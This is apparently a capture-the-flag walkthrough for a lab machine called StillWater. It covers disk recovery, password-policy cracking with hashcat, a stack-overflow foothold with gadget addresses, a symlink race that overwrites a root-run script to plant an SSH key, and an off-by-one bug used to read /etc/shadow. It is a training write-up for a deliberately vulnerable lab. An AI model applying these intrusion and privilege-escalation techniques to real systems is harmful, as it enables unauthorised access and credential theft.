# 29-stillwater

**Category:** Boot2Root | **Difficulty:** Hard (box 3 of the 4-box chain) | **Flags:** user `Null0rigin{you_rode_the_cycle_instead_of_reading_it}` / root `Null0rigin{the_sump_empties_on_its_own_schedule_not_yours}`

## Challenge Description

> The service has been running, untouched, for a very long time.

StillWater is the third machine in the chain. It isn't one magic exploit — it's a long chain of small, believable mistakes. Opening its **root** seal also requires `28-blackdamp`'s root flag.

## Recon & Initial Analysis

```bash
export IP=<TARGET_IP>
nmap -Pn -p- -sC -sV "$IP"
```

```text
22/tcp    SSH
80/tcp    public file share
7742/tcp  sump control head
9021/tcp  telemetry ingest
9022/tcp  float gauge
```

The web page openly lists downloads and even describes a damaged disk:

```text
survey-office.img   recovered office disk; front damaged, backup superblocks intact
pit-records.tar.gz  old pit records
levelbook-2019.7z   password-protected old levelbook
maint-chroot.tar.gz a maintenance filesystem
stillwaterd         the telemetry binary currently running on port 9021
```

**Decoy warning:** the maintenance image contains `Null0rigin{that_root_was_a_maintenance_image}` — not the flag. Real flags live in the encrypted "seal" files.

## Foothold / Core Concept

### 1. Recover the flooded office disk

`survey-office.img` has ~1 MiB of junk prepended and its primary superblock gone. Strip the prefix and read it through a **backup** superblock with `debugfs` (no root/mount needed):

```bash
dd if=loot/survey-office.img of=survey.ext bs=1M skip=1
debugfs -b 1024 -s 8193 survey.ext      # 8193 = backup sb at this size (9217 before the trim)
# debugfs: rdump / survey-recovered
```

Recovered goodies: `CREDENTIAL-STANDARD.txt`, `PERSONNEL-EXTRACT.txt`, `fragment-1.txt` (`FRAG1=e94837b2225e9dbf`), and `gauge.key` (`d12a01c4...ee9b8e`).

### 2. The password policy → tiny keyspaces (`make_candidates.py`)

Same chain-wide policy: transformed word + 2-digit seam + 3-digit shot + marker. Personnel rows:

```text
account   holder           seam  class
bundle    sallowthwaite    17    bundle
gauge     keldsough        28    contractor
sluice    quagwood         28    staff
root      wellflash        52    staff
```

Word + seam + class are fixed, so each crack is just 1000×6 = **6000** candidates:

```bash
python3 make_candidates.py wellflash 52 staff > root-candidates.txt
```

### 3. Low-priv shell via the telemetry stack overflow (`exploit_stillwater.py`)

The `stillwaterd` binary (static, non-PIE, not stripped) reads `0x320` bytes into a 256-byte stack buffer and ships a `field_recovery_shell(fd)` that dup2()s the socket to stdio and execs `/bin/sh`. Return address is 264 bytes in; the client socket is fd 5:

```text
0x40119d  field_recovery_shell
0x4011f6  pop rdi ; pop rsi ; pop rdx ; ret
0x4011f9  ret
```

```bash
python3 exploit_stillwater.py "$IP" 'id'     # -> uid=1001(svc)
```

As `svc`, `/opt/pumps/drain.tmpl` reveals that a daemon `pumpcycled` rebuilds `cycle.d/drain.sh` each minute and leaves it **gauge-group-writable for four seconds** before closing and running it as `pumpop`. Hold that thought.

### 4. Read the gauge, race the sump (`draw_sump.py`)

`README.txt` gives the gauge auth (`code = HMAC-SHA256(gauge_key, floor(time/600))[:4]`). After `AUTH`, `LEVEL` returns the water level; the sump service (7742) wants the **CRC-32 of that integer**, and the value rotates every 5 seconds — so read + submit in one quantum. The script handles the timing and downloads `sump-survey.7z` (base64 between PAYLOAD/END).

### 5. Crack the bundle + gauge key

```bash
hashcat -m 1800 bundle.hash bundle-candidates.txt   # -> sw-sallowthwaite17661&
7z x -p'sw-sallowthwaite17661&' sump-survey.7z -osump-survey
hashcat -m 1800 gauge.hash gauge-candidates.txt     # -> K3ld50ugh28885%  (Keldsough -> K3ld50ugh)
```

That password is also the passphrase on the `gauge` SSH key:

```bash
chmod 600 sump-survey/id_ed25519
ssh -i sump-survey/id_ed25519 gauge@$IP
```

`gauge` lands in a restricted shell `swsh` (prompt `pump$`): metacharacters/paths rejected, tiny allowlist (`cat cksum date du fold flock grep head help id logger ls nl pwd sleep sort stat tail uniq uptime wc whoami exit`). But **SFTP is still available**, and `sort -o` can write a file.

## Privilege Escalation

### 6. gauge → pumpop (symlink + `sort -o` race)

Plan: upload a payload via SFTP, make a symlink `target` → the live drain script, then during the 4-second window run `sort -o target payload` so `sort` follows the symlink and overwrites the privileged script; `pumpcycled` then runs it as `pumpop`.

```text
sftp> put payload payload
sftp> symlink /opt/pumps/cycle.d/drain.sh target
```

The payload (two lines, so `sort` can't scramble it) installs the gauge key's public half into `pumpop`'s `authorized_keys`. Fire the race just before the minute boundary:

```text
pump$ sort -o target payload        # repeat across the window
```

Then: `ssh -i sump-survey/id_ed25519 pumpop@$IP` → `uid=1003(pumpop)`.

### 7. Fragment 2 + user seal (`levels_parse.py`)

`pumpop` can read `/var/lib/stillwater/levels.dat` (96-byte records). Exactly one record has an *impossible* negative level, and its note carries `FRAG2=b685186c466bd2ce`:

```bash
ssh -i sump-survey/id_ed25519 pumpop@$IP 'cat /var/lib/stillwater/levels.dat' > levels.dat
python3 levels_parse.py levels.dat
/usr/local/bin/unseal-user e94837b2225e9dbf b685186c466bd2ce
# -> Null0rigin{you_rode_the_cycle_instead_of_reading_it}
```

### 8. Fragment 3 via the sluice off-by-one (loopback 7743)

```bash
nc 127.0.0.1 7743        # AUTH sluice <pw>; crack sluice.vfy -> Quagwood28873@
```

Five log slots (0–4), but the `GET` bounds check accepts slot **5**, which lands on the session-label pointer — so `LABEL <path>` + `GET 5` opens an arbitrary file as root:

```bash
printf 'AUTH sluice Quagwood28873@\nLABEL /etc/stillwater/seal.frag3\nGET 5\nQUIT\n' | nc 127.0.0.1 7743
# -> FRAG3=d70f14ea164169a1
printf 'AUTH sluice Quagwood28873@\nLABEL /etc/shadow\nGET 5\nQUIT\n' | nc 127.0.0.1 7743
hashcat -m 1800 root.hash root-candidates.txt      # -> Wellflash52199%
```

## Exploitation Walkthrough

Fragments concatenate (numerical order) into the 24-byte seed `e94837b2225e9dbfb685186c466bd2ced70f14ea164169a1`. The live sump-cycle code is a reversible HOTP (`cycle_code.py`). The `-c` chain key is `28-blackdamp`'s root flag:

```bash
CODE=$(python3 cycle_code.py)
/usr/local/bin/unseal \
  -s e94837b2225e9dbfb685186c466bd2ced70f14ea164169a1 \
  -o "$CODE" \
  -c 'Null0rigin{you_paid_for_every_candidate}' \
  -p 'Wellflash52199%'
# -> Null0rigin{the_sump_empties_on_its_own_schedule_not_yours}
```

`unseal` also checks the current boot's logged boot ID, so an offline disk mount won't open the real seal.

> Offline shortcut used while finishing the chain: because the root password feeds the seal key directly, you can brute-force the 6000 candidates **against the root seal itself** (two fast SHA-256s each) instead of the slow `$6$` shadow hash — see `30-deadlight/solve_stillwater_seal.py`. The decrypted plaintext starting with `Null0rigin{` (and matching the next box's committed hash) proves the password.

Full scripts: `exploit_stillwater.py`, `draw_sump.py`, `make_candidates.py`, `levels_parse.py`, `cycle_code.py`.

## Flags

user: `Null0rigin{you_rode_the_cycle_instead_of_reading_it}`
root: `Null0rigin{the_sump_empties_on_its_own_schedule_not_yours}`

(root password `Wellflash52199%`; keep the root flag — it's the chain key for `30-deadlight`.)

## Key Takeaways

- Backup superblocks (`debugfs -b 1024 -s <sb>`) recover an ext filesystem with no mount and no root.
- A company password formula collapses each account to a 6000-item keyspace.
- A classic non-PIE stack overflow plus a built-in shell function is the easiest foothold imaginable.
- Two services trusting synchronized, predictable measurements as "authentication" is not authentication.
- A restricted shell that still exposes SFTP, symlinks, and a file-writing `sort` is not restricted.
- A "physically impossible" sensor record is exactly where a designer hides a secret.
- An off-by-one array index can turn a session label into an arbitrary filename.
- Reversible time codes and boot-id checks are gates, not key material — don't let them convince you the live VM is mandatory for the crypto.
